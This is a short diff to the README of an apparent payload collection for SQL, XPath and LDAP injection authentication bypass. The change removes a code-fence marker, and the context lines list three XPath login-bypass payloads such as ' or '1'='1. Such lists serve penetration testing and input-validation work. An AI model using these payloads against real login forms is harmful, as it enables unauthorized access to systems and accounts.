@@ -1,7 +1,7 @@
 # SQL-Injection-Authentication-Bypass
 Xpath Injection, LDAP Injection, SQL Injection Authentication Bypass
 
-```XPATH Injection Authentication Bypass:
+XPATH Injection Authentication Bypass:
 ' or '1'='1
 ' or ''='
 ' or 1]%00
